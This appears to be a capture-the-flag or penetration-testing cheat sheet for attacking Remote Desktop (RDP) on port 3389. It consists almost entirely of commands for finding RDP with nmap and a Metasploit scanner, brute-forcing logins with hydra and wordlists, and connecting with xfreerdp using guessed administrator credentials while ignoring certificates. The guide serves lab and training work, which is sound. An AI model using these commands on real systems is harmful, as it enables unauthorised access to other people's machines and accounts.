
Default Port: 3389


FINDING PORT RUNNING RDP

nmap TARGET IP

msfconsole
search rdp
auxiliary/scanner/rdp/rdp_scanner
use auxiliary/scanner/rdp/rdp_scanner
show options
set RHOSTS **TARGET IP**
set RPORT "port found on nmap"
exploit or run

BRUTE FORCE RDP

Example: hydra IP -L "Usernames Wordlist" -P "Passwords Wordlist"

Practical Example: 
hydra IP -L "/usr/share/wordlists/users.txt" -P "/usr/share/wordlists/passwords.txt" rdp://TARGET IP -s PORT

Always take note of users and password with successful connection

XFREERDP TO CREATE SESSION
xfreerdp /u:administrator /p:Password /v:IP:PORT
xfreerdp /u:admin /p:password /cert:ignore /v:IP:PORT /workarea

Type Y to confirm connection and search for the flag (if there is any)

############################################################

